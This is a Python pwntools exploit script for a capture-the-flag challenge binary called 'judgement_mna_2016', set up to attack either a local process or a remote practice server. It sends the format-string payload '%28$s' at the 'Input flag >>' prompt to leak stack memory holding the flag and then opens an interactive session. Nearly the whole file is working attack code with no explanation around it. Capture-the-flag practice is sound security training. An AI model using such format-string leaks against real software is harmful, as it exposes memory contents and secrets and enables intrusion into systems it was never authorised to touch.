#! /usr/bin/python

import sys
from pwn import *
from LibcSearcher import *

sl = lambda x:p.sendline(x)
sla = lambda x,y:p.sendlineafter(x,y)
rv = lambda x:p.recv(x)
ru = lambda x:p.recvuntil(x)
ia = lambda :p.interactive()

if(sys.argv[1] == 'l'):
	p = process("./judgement_mna_2016")
	elf = ELF("./judgement_mna_2016")
else:
	p = remote("node3.buuoj.cn",26346)
	elf = ELF("./judgement_mna_2016")


payload = '%28$s'
sla("Input flag >>",payload)
ia()
